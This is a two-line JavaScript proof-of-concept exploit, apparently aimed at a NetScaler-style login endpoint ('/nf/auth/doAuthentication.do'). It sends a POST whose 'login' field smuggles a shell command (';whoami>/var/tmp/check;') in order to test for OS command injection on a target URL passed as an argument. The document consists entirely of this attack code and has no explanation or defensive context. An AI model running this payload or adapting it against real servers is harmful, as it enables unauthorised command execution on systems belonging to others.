const body = {'login': 'pitboss PPE missed too many heartbeats NSPPE-07;whoami>/var/tmp/check; X Y'};
fetch(process.argv[2] + '/nf/auth/doAuthentication.do', {method: 'POST', body: new URLSearchParams(body)});
